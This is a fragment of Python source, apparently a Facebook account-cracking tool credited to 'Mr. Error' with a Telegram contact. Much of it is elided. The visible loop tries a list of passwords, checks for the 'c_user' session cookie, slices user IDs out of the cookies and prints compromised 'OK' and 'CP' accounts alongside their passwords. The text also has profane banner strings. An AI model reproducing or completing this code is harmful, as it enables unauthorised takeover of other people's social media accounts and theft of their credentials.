...
'''
this is an open source program by Mr. Error (FUCK L-Vau)
...
def banner():
	...
	print("%s║%s  Telegram : Error       %s║"%(Z,B,Z))
	...
	try:
		for pasw in pwx:
			...
			if 'c_user' in fb_cookies:
				...
				uidx = coki[65:80]
				print('\033[1;32m [FUCK L-OK] '+uidx+'|'+pasw+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				uidx = coki[82:97]
				print('\033[1;31m [FUCK L-CP] '+uidx+' | '+pasw+'\033[0;97m')
